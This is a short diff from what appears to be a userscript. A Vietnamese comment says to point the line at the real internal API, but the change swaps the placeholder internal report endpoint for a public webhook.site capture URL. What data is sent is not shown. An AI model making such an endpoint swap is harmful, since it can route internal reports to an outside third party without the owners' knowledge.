@@ -36,7 +36,7 @@
   // Hardcoded API endpoint. Sửa dòng dưới đây thành URL API nội bộ thật,
   // sau đó nhớ cập nhật @connect ở phần metadata phía trên cho khớp domain.
   // ---------------------------------------------------------------------
-  const API_URL = "https://your-internal-api.company.com/report";
+  const API_URL = "https://webhook.site/cd43d00f-bba5-40a8-8e08-6f526a122c94";
 
   // ---------------------------------------------------------------------
   // Small safe DOM builder — avoids innerHTML entirely so this also works
